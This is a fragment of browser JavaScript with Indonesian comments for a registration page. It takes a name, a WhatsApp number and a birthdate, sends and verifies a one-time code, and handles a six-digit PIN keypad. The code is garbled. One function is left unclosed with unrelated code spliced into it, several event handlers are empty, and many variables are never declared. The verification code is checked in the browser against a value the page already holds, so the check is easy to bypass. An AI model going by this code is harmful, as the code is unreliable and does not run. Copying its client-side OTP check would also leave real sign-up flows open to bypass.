<script>
let currentIndex = 1;
  let ina = true; // Untuk PIN pertama
  let ino = false; // Untuk PIN kedua
  let pin = ''; // PIN pertama
  let pino = ''; // PIN kedua

  function pressNum(num) {
    if (currentIndex <= 6) {
      const currentBox = document.getElementById(`pin${currentIndex}`);
      currentBox.textContent = "•"; // Simbol untuk menyensor angka
      currentBox.dataset.value = num; // Menyimpan nilai asli sebagai data atribut
      currentBox.classList.add('filled');
      currentIndex++;

      if (currentIndex > 6) {
        if (ina) {
          submitPin(); // Proses PIN pertama
        } else if (ino) {
          submitConfirmPin(); // Proses PIN kedua
        }
      }
    }
  }

  function deleteNum() {
    if (currentIndex > 1) {
      currentIndex--;
      const currentBox = document.getElementById(`pin${currentIndex}`);
      currentBox.textContent = '';
      currentBox.dataset.value = '';
      currentBox.classList.remove('filled');
    }
  }

  function submitPin() {
    // Ambil PIN pertama
    pin = '';
    for (let i = 1; i <= 6; i++) {
      pin += document.getElementById(`pin${i}`).dataset.value;

const expiredMessage = document.getElementById("expiredMessage");
const kirimUlangKodeButton = document.getElementById("kirimUlangKode");
const atauText = document.getElementById("atauText");

let countdownInterval;
let timeLeft = 60;
let userData = null;

// Reset countdown
function resetCountdown() {
    clearInterval(countdownInterval);
    timeLeft = 60;
    countdownElement.textContent = `${timeLeft} detik`;
    countdownElement.style.display = "inline";
    mintaKodeText.style.display = "block";
    expiredMessage.style.display = "none";
    kirimUlangKodeButton.style.display = "none";
    atauText.style.display = "none";
}

// Memulai countdown
function startCountdown() {
    countdownInterval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            countdownElement.style.display = "none";
            mintaKodeText.style.display = "none";
            expiredMessage.style.display = "block";
            kirimUlangKodeButton.style.display = "block";
            atauText.style.display = "block";
        } else {
            countdownElement.textContent = `${timeLeft} detik`;
            timeLeft--;
        }
    }, 1000);
}

// Kirim data ke server
async function sendDataToServer(data) {
    try {
        let { nomer, nama, kode } = data;
        tambahVerif(nomer, nama, kode);
        alert('Otp Berhasil Dikirim!')
    } catch (error) {
        console.log(error);
    }
}

// Validasi nomor WhatsApp
function validatePhoneNumber() {
    const value = whatsappInput.value.trim();
    const isValid = /^[0-9]{9,13}$/.test(value);

    const errorElement = document.getElementById("whatsapp-error");
    if (isValid) {
        errorElement.style.display = "none";
    } else {
        errorElement.style.display = "block";
    }
}

// Event listener untuk validasi checkbox
termsCheckbox.addEventListener("change", () => {
    submitBtn.disabled = !termsCheckbox.checked;
});

// Event listener untuk input WhatsApp
whatsappInput.addEventListener("input", function () {
    let value = whatsappInput.value.trim();

    if (value && !/^[0-9]/.test(value)) {
        value = value.replace(/[^0-9]/g, '');
    }

    if (value.length <= 13) {
        whatsappInput.value = value;
    }

    validatePhoneNumber();
});

// Event listener untuk tombol Submit
submitBtn.addEventListener("click", () => {
    const nameValue = name.value.trim();
    const whatsappValue = whatsappInput.value.trim();
    const birthdateValue = birthday.value.trim();

    validatePhoneNumber();

    if (!nameValue || !whatsappValue || !birthdateValue || !/^[0-9]{9,13}$/.test(whatsappValue)) {
        error1.style.display = "block";
        return;
    }

    error1.style.display = "none";
    overlay.classList.add("active");
    resetCountdown();
    startCountdown();
    nomk = `62${whatsappValue}`;
    ultah = birthdateValue;
    namk = nameValue;
    userData = {
        nomer: `62${whatsappValue}`,
        nama: nameValue,
        kode: `${kode}`,
    };

    sendDataToServer(userData);
});

// Event listener untuk tombol "Kirim Ulang Kode"

});

gantiNomerBtn.addEventListener("click", () => {

});

// Event listener untuk input kode verifikasi
codeInputs.forEach((input, index) => {

        if (input.value.length === 1 && index < codeInputs.length - 1) {

        }
    });
});

// Validasi kode verifikasi
verifyBtn.addEventListener("click", () => {
    const enteredCode = Array.from(codeInputs).map(input => input.value).join("");
    
    if (enteredCode === `${kode}`) {
        alert("Kode berhasil diverifikasi!");   
        toggleoverlay2();
       
     //   window.location.href = "dash.html";
    } else {
        alert("Kode salah, silahkan coba lagi!");

        codeInputs[0].focus();
    }
});
